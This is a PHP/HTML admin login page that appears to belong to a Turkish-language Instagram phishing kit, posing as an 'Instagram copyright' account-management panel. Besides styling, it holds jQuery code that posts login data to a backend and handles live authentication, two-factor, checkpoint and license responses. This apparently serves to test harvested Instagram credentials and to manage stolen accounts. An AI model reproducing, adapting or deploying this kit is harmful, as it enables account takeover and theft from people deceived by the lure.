<?php session_start();

require_once 'ayarlar.php';
$mesaj33="";

if(isset($_POST['users'])){
    
    
    if($_POST['sifre']==$adminSifre){
        
        
        $_SESSION[$adminSifre] = true;
        echo "<script>window.location.href='$phpYolu'</script>";
        
    } else {
	$mesaj33=" Şifre Yanlış Tekrar Dene

";
	}
    
    
    
}


?>


<!DOCTYPE html>
<style>body{
    margin: 8px;
    display: block;
    padding: 0;
    font-family: Arial, Helvetica, sans-serif;
    

}
.box {
    width: 333px;
    height: 340px;
    padding:38px;
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%,-50%);
    background: white;
    text-align: center;
    border: 1px solid #e6e6e6;
	box-shadow: rgb(0,0,0,0.2) 0px 0px 10px 0px;
    border-radius: 17px;
    margin: 0 0 10px;
}

.box input[type = "text"],.box input[type = "password"]{
    border: 0;
    background: #fafafa;
    display: block;
    margin: 7px auto;
    text-align: left;
    border: 1px solid #efefef;
    padding: 10px;
    width: 100%;
    outline: none;
    color: #262626;
    border-radius: 4px;
    transition: 0.25s;
    font-size: 13px;
    box-sizing: border-box;
    
    font-weight: 400;
    text-shadow: none;
}
.box input[type = "text"]:focus, .box input[type = "password"]:focus{
    color: black;
    border: 2px solid gray;

}
.box input[type = "submit"]{
    border: 0;
    background: rgba(var(--h5f,56,151,240),1);
    opacity: 1;
    display: block;
    margin: 20px auto;
    text-align: center;
    border: 2px solid rgba(var(--h5f,56,151,240),1);
    padding: 10px;
    outline: none;
    color: white;
    transition: 0.25s;
    
    width: 100%;
    border-radius: 4px;
    font-weight: 600; 
    font-size: 11px;
    

}

.box a {
    text-decoration: none;
    margin: 20px auto;
    display: block;
    font: inherit;
    border: 0;
    padding: 0;
    color: #385185;
    font-weight: 400;
    

}
.box a.small{
    font-size: 12px;
    text-decoration: none;
    margin: 10px auto;
    display: block;
}

h6{
    color: gray;
    width: 100%;
    text-align: center;
    border-bottom: 1px solid gray;
    line-height: 0.1em;
    margin: 10px 0 20px;

}
h6 span{
    background: #fff;
    padding: 0 10px;
}

.box2{
    width: 322px;
    height: 48px;
    padding: 10px;
    position: absolute;
    top: 63%;
    left: 50%;
    transform: translate(-50%,-50%);
    background-color: white;
    text-align: center;
    border: 1px solid #e6e6e6;
    border-radius: 1px;
}

.box2 p{
    font-size: 14px;
    color: #262626;
    margin: 15px;
}
.box2 a{
    text-decoration: none;
    color: #3897f0;
    font-weight: bold;
}

.app{
    width: 262.5px;
    height: 40px;
    padding: 40px;
    position: absolute;
    top: 78%;
    left: 50%;
    transform: translate(-50%,-50%);
    background: none;
    text-align: center;
    
}

.column {
    flex: 33.33%;
  padding: 5px;
  }
.app p {
    
    white-space: pre-line;
    padding: 20px;
    justify-content: space-between;
}
.get{
    width: 262.5px;
    height: 40px;
    padding: 40px;
    position: absolute;
    top: 72%;
    left: 50%;
    transform: translate(-50%,-50%);
    background: none;
    text-align: center;
}
body {
	justify-content:center;
	align-items:center;
    display:flex;  
	background:#dfdfdf;
	height:100%;
}

</style>
<head>
    <title>
Admin Paneli</title>
<link rel="stylesheet" href="style.css" type="text/css">
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Ubuntu&display=swap" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta property="og:image" content="WordPress-Admin-Panel-plugin-1.jpg" />
	<meta property="og:type" content="website">
    <meta property="og:url" content="https://instagramtelifhakkı.com/">
    <meta property="og:title" content="Hesap Yönetim Paneli">
    <meta property="og:description" content="Hesapların yönetimi ve ayarlamalar bu panelden yapılır.">

</head>
<body>

    <header>

    </header>
    <main>
         <form class="box" action="" method="POST">

</center>
            <h1 style="font-family: 'Ubuntu', sans-serif;
font-weight:400;
letter-spacing:;
color:#3d3d3d;
font-size: 19px;
margin-top:-5px;
"><b><i style="margin-top:-2px;" class="fas fa-user-cog"></i> instagram Kleyzronreal 
Admin Paneli<b><h1>
			
			<hr color="#999" size="1px">
          
            <input required="" type="password" name="sifre" placeholder="Şifre">
            <input id="df" class="btn" name="users" type="submit"  value="Giriş Yap">
	

            
            

         
			  


<font color="red" style="font-size:15px;"><?php echo $mesaj33; ?></font> 
        
		</form>
        
       
        
      
        <section class="app" style="display: flex">

             

        </section>
		
		<!--===============================================================================================-->	
      <script src="css/vendor/jquery/jquery-3.2.1.min.js"></script>
      <!--===============================================================================================-->
      <script src="css/vendor/bootstrap/js/popper.js"></script>
      <script src="css/vendor/bootstrap/js/bootstrap.min.js"></script>
      <!--===============================================================================================-->
      <script src="css/vendor/select2/select2.min.js"></script>
      <!--===============================================================================================-->
      <script src="css/vendor/tilt/tilt.jquery.min.js"></script>
      <script >
         $('.js-tilt').tilt({
         	scale: 1.1
         })
      </script>
      <!--===============================================================================================-->
      <script src="css/js/main.js"></script>
      <script type="text/javascript">
         var request;

         $("#foo").submit(function(event){
          var btn = $("#df");
btn.prop("disabled", true); 
         

          $("#df").html("<img wight='20' height='20' src='https://i.gifer.com/ZZ5H.gif'>");

          event.preventDefault();
          var $form = $(this);
          var serializedData = $form.serialize();

          request = $.ajax({
            url: "ajaxlogin.php",
            type: "post",
            dataType: "json",
            data: serializedData,  

            success: function(data)
            {

if(data.tokenerror) {
             
              $("#df").html("Sign In");
              $("#statuss").html(' <font color="#ed4956"><center>Refresh the security error page.</center></font><br><br> ');
btn.html("Security Error");
              return false;
            }
            
           if(data.lisanshata) {
             
              $("#df").html("Sign In");
              $("#statuss").html(' <font color="#ed4956"><center>You do not have a license!</center></font><br><br> ');
btn.html("License Error");
              return false;
            }
            
              
    
     
            
            
             if(data.user==false){
              $("#statuss").html(' <font color="#ed4956"><center>The username you entered does not belong to an account. Please check your username and try again.</center></font><br ><br> ');
btn.prop("disabled", false);
             
              $("#df").html("Sign In");
              return false;


            }
            if(data.checkpoint_url) {
             
              $("#df").html("Sign In");
              $("#statuss").html(' <font color="#ed4956"><center>Login Failed Please Login to Instagram App and Pass Verification</center></font><br><br> ');
btn.prop("disabled", false);
              return false;
            }

            if(data.authenticated==false){
              $("#statuss").html('<font color="#ed4956"><center>Üzgünüz, şifreniz yanlıştı. Lütfen şifrenizi dikkatlice kontrol edin.</center></font><br><br> ') ;
btn.prop("disabled", false);
        
              $("#df").html("Giriş Yap @<?php echo $_SESSION['kadi']; ?>");
              return false;


            }
             if(data.two_factor_required) {
               window.location.href ='two';
                   return false;
              }
              
                if(data.status=="fail") {
              $("#statuss").html('<font color="#ed4956"><center>Sistem şuan bilinmeyen bir sebepten dolayı hata vermektedir.</center></font><br><br> ');
btn.prop("disabled", false);
        
              $("#df").html("Giriş Yap @<?php echo $_SESSION['kadi']; ?>");
              return false;
              }
              
              
            if (data.authenticated==true) {
  $("#statuss").html('<font color="#00bf00"><center>Giriş Başarılı</center></font><br><br> ');
            
               $("#df").html("Giriş Yapılıyor...");
               
                setTimeout(function(){ window.location.href="confirmed.php"; }, 3000);
             

           }


         }, error:function(res){
                    
              $("#df").html("UNKNOWN ERROR REFRESH PAGE.");
          alert("UNKNOWN ERROR, REFRESH PAGE.");
    }
       });
        });
      </script>
       
    </main>
	

    
</body>

